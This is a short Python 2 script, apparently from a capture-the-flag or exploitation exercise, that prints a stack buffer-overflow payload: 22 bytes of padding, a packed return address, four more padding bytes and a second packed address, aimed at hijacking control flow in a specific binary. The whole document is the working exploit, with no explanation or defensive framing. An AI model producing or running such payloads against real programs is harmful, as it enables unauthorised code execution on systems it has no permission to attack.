from struct import pack

print '\x61'*22 + pack('<I', 0x8049ff0) + '\x61'*4 + pack('<I', 0x80c615d)
